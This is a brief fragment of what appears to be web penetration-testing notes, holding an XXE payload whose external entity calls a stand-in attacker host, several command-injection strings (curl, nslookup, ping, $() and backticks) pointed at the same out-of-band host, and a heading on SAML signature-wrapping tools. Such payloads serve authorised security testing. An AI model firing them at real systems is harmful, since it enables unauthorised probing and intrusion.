...
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.oast.pro/xxe">]>
<foo>&xxe;</foo>
```
...
# Modify in Caido Replay before sending
...
```bash
; curl https://attacker.oast.pro
; nslookup attacker.oast.pro
$(nslookup attacker.oast.pro)
`ping -c 1 attacker.oast.pro`
...
### Tools
```bash
# SAML Raider (standalone) — most automated XSW testing
